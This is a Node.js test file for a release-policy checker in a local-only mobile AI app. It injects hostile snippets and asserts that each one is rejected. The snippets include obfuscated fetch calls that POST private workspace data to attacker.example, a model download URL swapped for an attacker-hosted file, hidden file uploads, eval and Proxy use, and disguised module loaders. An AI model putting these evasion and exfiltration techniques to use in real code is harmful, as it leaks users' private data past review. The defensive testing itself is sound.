import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { resolve } from "node:path";
import test from "node:test";
import {
  loadReleaseFiles,
  validateReleasePolicy
} from "./check-non-medical-release.mjs";

const root = resolve(import.meta.dirname, "..");
const baseline = loadReleaseFiles(root);
const expoFileSystemDeclarationFiles = [
  "index.d.ts",
  "FileSystem.d.ts",
  "ExpoFileSystem.types.d.ts",
  "legacyWarnings.d.ts",
  "pathUtilities/index.d.ts",
  "legacy/index.d.ts",
  "legacy/FileSystem.d.ts",
  "legacy/FileSystem.types.d.ts"
];
const expoFileSystemTypeDeclarations = new Map(
  expoFileSystemDeclarationFiles.map((file) => [
    file,
    readFileSync(
      resolve(root, "node_modules/expo-file-system/build", file),
      "utf8"
    )
  ])
);

function mutate(file, transform) {
  const files = new Map(baseline);
  files.set(file, transform(files.get(file)));
  return validateReleasePolicy(files);
}

test("accepts exact line-level policy, legacy, and network contracts", () => {
  assert.equal(validateReleasePolicy(baseline).status, "pass");
});

test("rejects a prohibited health feature hidden in a formerly allowlisted file", () => {
  const report = mutate(
    "apps/mobile/src/local-ai/assistantPolicy.ts",
    (source) => `${source}\nexport const healthDiagnosisFeature = "진단 지원";\n`
  );
  assert.match(report.problems.join("\n"), /unapproved health/);
});

test("rejects cloud surface and network APIs hidden in a policy file", () => {
  const report = mutate(
    "packages/life-core/src/policy.ts",
    (source) => `${source}\nconst analytics = fetch("/collect");\n`
  );
  const problems = report.problems.join("\n");
  assert.match(problems, /health or cloud/);
  assert.match(problems, /network API/);
});

test("rejects dynamic and concatenated remote endpoints without a literal complete URL", () => {
  const report = mutate(
    "apps/mobile/src/local-ai/assistantPolicy.ts",
    (source) => `${source}\nconst endpoint = "https" + "://attacker.example";\nfetch(endpoint);\n`
  );
  const problems = report.problems.join("\n");
  assert.match(problems, /computed remote URL/);
  assert.match(problems, /network API/);
});

test("rejects split global fetch names and array-joined production-only exfiltration URLs", () => {
  const report = mutate(
    "apps/mobile/src/local-ai/assistantPolicy.ts",
    (source) => `${source}
const netName = "fet" + "ch";
const remote = ["h", "ttps", ":", "/", "/", "attacker.example/collect"].join("");
if ((globalThis as any).navigator?.product === "ReactNative") {
  void (globalThis as any)[netName](remote, {
    method: "POST",
    body: JSON.stringify({ workspace: "private" })
  });
}
`
  );
  const problems = report.problems.join("\n");
  assert.equal(report.status, "fail");
  assert.match(problems, /computed remote URL/);
  assert.match(problems, /unapproved network API \(fetch\)/);
});

test("rejects aliased template endpoints and unresolved computed global calls fail closed", () => {
  const aliased = mutate(
    "apps/mobile/src/local-ai/assistantPolicy.ts",
    (source) => `${source}
const transportName = \`fet\${"ch"}\`;
const remoteHost = "attacker.example";
const remoteEndpoint = \`https://\${remoteHost}/collect\`;
const transport = (globalThis as any)[transportName];
void transport(remoteEndpoint);
`
  );
  const dynamic = mutate(
    "apps/mobile/src/local-ai/assistantPolicy.ts",
    (source) => `${source}
declare function chooseTransport(): string;
void (globalThis as any)[chooseTransport()]("/collect");
`
  );

  assert.match(aliased.problems.join("\n"), /network API \(fetch\)/);
  assert.match(aliased.problems.join("\n"), /computed remote URL/);
  assert.match(dynamic.problems.join("\n"), /dynamic global network capability/);
});

test("rejects Reflect.get plus character-code restoration of a React Native-only transport", () => {
  const report = mutate(
    "apps/mobile/src/local-ai/assistantPolicy.ts",
    (source) => `${source}
const reviewTransport = Reflect.get(
  globalThis,
  String.fromCharCode(102, 101, 116, 99, 104)
) as (...args: any[]) => unknown;
const reviewEndpoint = String.fromCharCode(
  104,116,116,112,115,58,47,47,97,116,116,97,99,107,101,114,46,
  101,120,97,109,112,108,101,47,99,111,108,108,101,99,116
);
if ((globalThis as any).navigator?.product === "ReactNative") {
  void reviewTransport(reviewEndpoint, {
    method: "POST",
    body: JSON.stringify({ workspace: "private" })
  });
}
`
  );

  assert.equal(report.status, "fail");
  assert.match(report.problems.join("\n"), /reflect|dynamic capability|global object/i);
});

test("rejects dynamic code constructors, proxies, and every computed call surface", () => {
  const dynamicCode = mutate(
    "apps/mobile/src/local-ai/assistantPolicy.ts",
    (source) => `${source}
const runtimeEval = eval;
const RuntimeFunction = Function;
const runtimeProxy = new Proxy({}, {});
void runtimeEval("1");
void new RuntimeFunction("return 1");
void runtimeProxy;
`
  );
  const computedCall = mutate(
    "apps/mobile/src/local-ai/assistantPolicy.ts",
    (source) => `${source}
const handlers = { safe: () => undefined };
const selectedHandler = "safe";
handlers[selectedHandler]();
`
  );

  assert.match(dynamicCode.problems.join("\n"), /dynamic code|Proxy|eval|Function/i);
  assert.match(computedCall.problems.join("\n"), /computed call/i);
});

test("rejects direct or aliased mutation of built-in facades", () => {
  const report = mutate(
    "apps/mobile/src/local-ai/assistantPolicy.ts",
    (source) => `${source}
const reviewObjectFacade = Object;
Object.defineProperty(reviewObjectFacade, "freeze", {
  value: <T>(input: T): T => input
});
reviewObjectFacade.isFrozen = (_input: unknown): boolean => true;
`
  );

  assert.equal(report.status, "fail");
  assert.match(report.problems.join("\n"), /built-in facade mutation/i);
});

test("rejects hiding a global network capability inside an object facade", () => {
  const report = mutate(
    "apps/mobile/src/local-ai/assistantPolicy.ts",
    (source) => `${source}
const reviewNetworkFacade = { transport: fetch };
void reviewNetworkFacade.transport("/collect");
`
  );

  assert.equal(report.status, "fail");
  assert.match(report.problems.join("\n"), /unapproved network API \(fetch\)/i);
});

test("rejects every legacy upload surface and the new expo-file-system download API", () => {
  const directUpload = mutate(
    "apps/mobile/src/ui/LocalAiSettingsScreen.tsx",
    (source) => source.replace(
      "      const text = await FileSystem.readAsStringAsync(uri);",
      `      const text = await FileSystem.readAsStringAsync(uri);
      await FileSystem.uploadAsync("/collect", uri);`
    )
  );
  const uploadTask = mutate(
    "apps/mobile/src/local-ai/modelStore.ts",
    (source) => `${source}
async function reviewUpload(uri: string): Promise<void> {
  const ExpoFileSystem = await import("expo-file-system/legacy");
  const task = ExpoFileSystem.createUploadTask("/collect", uri);
  await task.uploadAsync();
}
`
  );
  const newApi = mutate(
    "apps/mobile/src/local-ai/assistantPolicy.ts",
    (source) => `${source}
async function reviewNewFileSystemApi(file: unknown): Promise<void> {
  const NewFileSystem = await import("expo-file-system");
  await NewFileSystem.File.downloadFileAsync("/collect", file as never);
}
`
  );

  for (const report of [directUpload, uploadTask, newApi]) {
    assert.equal(report.status, "fail");
    assert.match(
      report.problems.join("\n"),
      /expo-file-system|upload|downloadFileAsync|network API/i
    );
  }
});

test("rejects extra file-system imports, destructuring, aliases, and computed members", () => {
  const extraStaticImport = mutate(
    "apps/mobile/src/local-ai/assistantPolicy.ts",
    (source) => `${source}
import * as ReviewFileSystem from "expo-file-system/legacy";
void ReviewFileSystem.getInfoAsync("file:///private");
`
  );
  const destructured = mutate(
    "apps/mobile/src/ui/LocalAiSettingsScreen.tsx",
    (source) => source.replace(
      '      const FileSystem = await import("expo-file-system/legacy");',
      '      const { readAsStringAsync: FileSystemRead } = await import("expo-file-system/legacy");'
    ).replace(
      "      const text = await FileSystem.readAsStringAsync(uri);",
      "      const text = await FileSystemRead(uri);"
    )
  );
  const aliased = mutate(
    "apps/mobile/src/local-ai/modelStore.ts",
    (source) => source.replace(
      "    await ExpoFileSystem.makeDirectoryAsync(uri, { intermediates: true });",
      `    const FileSystemAlias = ExpoFileSystem;
    await FileSystemAlias.makeDirectoryAsync(uri, { intermediates: true });`
    )
  );
  const computed = mutate(
    "apps/mobile/src/storage/mobileWorkspaceRepository.ts",
    (source) => source.replace(
      "FileSystem.getInfoAsync(`${directory}${separator}${name}`)",
      'FileSystem["getInfoAsync"](`${directory}${separator}${name}`)'
    )
  );

  for (const report of [extraStaticImport, destructured, aliased, computed]) {
    assert.equal(report.status, "fail");
    assert.match(
      report.problems.join("\n"),
      /expo-file-system|computed call|namespace|import|member/i
    );
  }
});

test("fails closed when either expo-file-system entry point gains a public API", () => {
  const legacyDeclarations = new Map(expoFileSystemTypeDeclarations);
  legacyDeclarations.set(
    "legacy/FileSystem.d.ts",
    `${legacyDeclarations.get("legacy/FileSystem.d.ts")}
export declare function transmitFileAsync(url: string, fileUri: string): Promise<void>;
`
  );
  const mainDeclarations = new Map(expoFileSystemTypeDeclarations);
  mainDeclarations.set(
    "ExpoFileSystem.types.d.ts",
    `${mainDeclarations.get("ExpoFileSystem.types.d.ts")}
export declare function transmitFileAsync(url: string, fileUri: string): Promise<void>;
`
  );

  for (const declarations of [legacyDeclarations, mainDeclarations]) {
    const report = validateReleasePolicy(baseline, {
      expoFileSystemTypeDeclarations: declarations
    });
    assert.equal(report.status, "fail");
    assert.match(report.problems.join("\n"), /expo-file-system.*inventory/i);
  }
});

test("fails closed when the installed expo-file-system version drifts", () => {
  const report = validateReleasePolicy(baseline, {
    expoFileSystemVersion: "19.0.24"
  });

  assert.equal(report.status, "fail");
  assert.match(report.problems.join("\n"), /expo-file-system installed version mismatch/i);
});

test("rejects require aliases and every indirect loader invocation shape", () => {
  const cases = [
    ["alias", `
const reviewLoader = require;
void reviewLoader("expo-file-system/legacy");
`],
    ["call", `
void require.call(undefined, "expo-file-system/legacy");
`],
    ["apply", `
void require.apply(undefined, ["expo-file-system/legacy"]);
`],
    ["bind", `
const reviewLoader = require.bind(undefined);
void reviewLoader("expo-file-system/legacy");
`],
    ["sequence", `
void (0, require)("expo-file-system/legacy");
`],
    ["module member", `
void module.require("expo-file-system/legacy");
`],
    ["computed member", `
const reviewLoader = module["requ" + "ire"];
void reviewLoader("expo-file-system/legacy");
`],
    ["module facade alias", `
const reviewModuleFacade = module;
const reviewLoaderName = Date.now() > 0 ? "require" : "other";
const reviewLoader = reviewModuleFacade[reviewLoaderName];
void reviewLoader("expo-file-system/legacy");
`],
    ["global member", `
void globalThis.require("expo-file-system/legacy");
`],
    ["destructure", `
const { require: reviewLoader } = module;
void reviewLoader("expo-file-system/legacy");
`],
    ["return", `
function reviewLoaderFactory() {
  return require;
}
void reviewLoaderFactory()("expo-file-system/legacy");
`],
    ["pass", `
function reviewUseLoader(loader: (id: string) => unknown) {
  return loader("expo-file-system/legacy");
}
void reviewUseLoader(require);
`],
    ["createRequire", `
import { createRequire } from "node:module";
const reviewLoader = createRequire(import.meta.url);
void reviewLoader("expo-file-system/legacy");
`],
    ["builtin module", `
const reviewNodeModule = process.getBuiltinModule("node:module");
const reviewLoader = reviewNodeModule.createRequire(import.meta.url);
void reviewLoader("expo-file-system/legacy");
`]
  ];
  const results = cases.map(([name, suffix]) => [
    name,
    mutate(
      "apps/mobile/src/local-ai/assistantPolicy.ts",
      (source) => `${source}${suffix}`
    )
  ]);
  const escaped = results
    .filter(([, report]) => report.status === "pass")
    .map(([name]) => name);

  assert.deepEqual(escaped, []);
  for (const [, report] of results) {
    assert.match(
      report.problems.join("\n"),
      /module loader|require|node:module|global object/i
    );
  }
});

test("allows only exact direct literal require contracts", () => {
  const directFileSystem = mutate(
    "apps/mobile/src/local-ai/assistantPolicy.ts",
    (source) => `${source}
void require("expo-file-system/legacy").getInfoAsync("file:///private");
`
  );
  const nonLiteral = mutate(
    "apps/mobile/src/local-ai/assistantPolicy.ts",
    (source) => `${source}
const reviewModuleName = "expo-file-system/legacy";
void require(reviewModuleName);
`
  );
  const changedApprovedModule = mutate(
    "apps/mobile/metro.config.js",
    (source) => source.replace(
      'const path = require("path");',
      'const path = require("node:path");'
    )
  );
  const changedCpuPluginLoader = mutate(
    "apps/mobile/plugins/with-cpu-only-llama.js",
    (source) => source.replace(
      'const { withAppBuildGradle } = require("@expo/config-plugins");',
      'const { withAppBuildGradle } = require("@expo/config-plugins/unsafe");'
    )
  );
  const duplicatedMobilePluginExport = mutate(
    "apps/mobile/plugins/with-mobile-react-root.js",
    (source) => `${source}
module.exports = withMobileReactRoot;
`
  );

  for (
    const report of [
      directFileSystem,
      nonLiteral,
      changedApprovedModule,
      changedCpuPluginLoader,
      duplicatedMobilePluginExport
    ]
  ) {
    assert.equal(report.status, "fail");
    assert.match(report.problems.join("\n"), /expo-file-system|require|module loader|module export/i);
  }
});

test("rejects an array-joined remote URL used in a conditional registry mutation", () => {
  const report = mutate(
    "apps/mobile/src/local-ai/modelRegistry.ts",
    (source) => `${source}
if ((globalThis as any).navigator?.product === "ReactNative") {
  (MODEL_REGISTRY[0] as { downloadUrl: string }).downloadUrl =
    ["h", "ttps", ":", "/", "/", "attacker.example/model.gguf"].join("");
}
`
  );

  assert.equal(report.status, "fail");
  assert.match(report.problems.join("\n"), /computed remote URL/);
});

test("rejects changes or duplicates in intentional denial and cloud-disable lines", () => {
  const report = mutate(
    "apps/mobile/plugins/with-local-only-notifications.js",
    (source) => source.replace(
      'setBooleanMetadata(application, "firebase_analytics_collection_enabled", false);',
      'setBooleanMetadata(application, "firebase_analytics_collection_enabled", true);'
    )
  );
  const problems = report.problems.join("\n");
  assert.match(problems, /unapproved health or cloud/);
  assert.match(problems, /must occur exactly once/);
});
